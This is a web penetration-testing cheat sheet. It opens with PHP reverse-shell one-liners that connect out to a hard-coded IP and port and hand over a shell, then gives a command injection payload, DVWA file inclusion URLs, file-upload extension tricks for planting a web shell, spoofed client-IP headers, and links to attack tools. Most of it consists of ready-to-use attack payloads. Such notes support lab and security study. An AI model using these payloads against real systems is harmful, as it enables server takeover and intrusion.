# WEB

Shells
------

* Reverse shell one-liners:
```
<?php $s=fsockopen(\"192.168.16.124\",1234);exec("sh<%263>%263 2>%263");?>  
<?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>
```

* [Weevely](https://github.com/epinna/weevely3/) - great command line web shell with good features


XSRF (Cross-site Request Forgery)
---------------------------------

* [CSurfer](https://github.com/asaafan/CSurfer/) - CSRF guard hiding extension for Burp
* [CSRF-Request-Builder](https://github.com/TheRook/CSRF-Request-Builder/) - tool for testing CSRF against web services


Command Injection
-----------------

* Try to use pipe, ampersands, etc. Example: `1 | uname -a & users & id`


File Inclusion
--------------------

Local: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`  
Remote: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`

File Upload
-----------

* Image upload restrictions [bypass](http://hackers2devnull.blogspot.lt/2013/05/how-to-shell-server-via-image-upload.html):

```
shell.jpg.php (satisfies as check for jpg only)
shell.jpg.PhP (obfuscation)
shell.php;.jpg (sometimes can ignore whats after ";")
shell.php%0delete0.jpg (the infamous NULL byte which comments out trailing text, remove the word delete so the zeros join together, blogspot strips this string!)
shell.php.test (defaults to first recognised extension ignoring "test")
shell.php.xxxjpg (still ends in .jpg, but not recognised extension so will default to php!)
.phtml (a commonly used php parsed extension often forgotten about!)
.php3/.php4/.php5 (valid PHP extensions possibly left out of extension blacklists)
```

* [evilarc](https://github.com/ptoomey3/evilarc) - creates zip files with dir traversal characters in their embedded path


IP Spoofing
-----------

Accept: */*
x-forwarded-for: 127.0.0.1  
x-remote-IP: 127.0.0.1  
x-originating-IP: 127.0.01  
x-remote-addr: 127.0.0.1  
x-remote-ip: 127.0.0.1  
x-forwarded-for 127.0.0.1  

Sometimes referer needs to be deleted in the request.

Nikto
-----

Simple scan:

```
perl nikto.pl -host http://www.example.com
```

Drupal
------

* [Attacking Drupal](http://www.slideshare.net/heinzarelli/attacking-drupal)
* [DPScan](http://www.ehacking.net/2012/02/dpscan-drupal-security-scanner-tutorial.html)

Browser-Related
---------------

* [Chrome "No Web Security"](https://bugs.chromium.org/p/chromium/issues/detail?id=575690) - Chrome can be started with less web security mode using flag "--disable-web-security"  
* Pentesting plugins: [Firebug](http://getfirebug.com/), [Cookies Manager+](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/), [FoxyProxy](https://getfoxyproxy.org/), [Tamper Data](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/)  
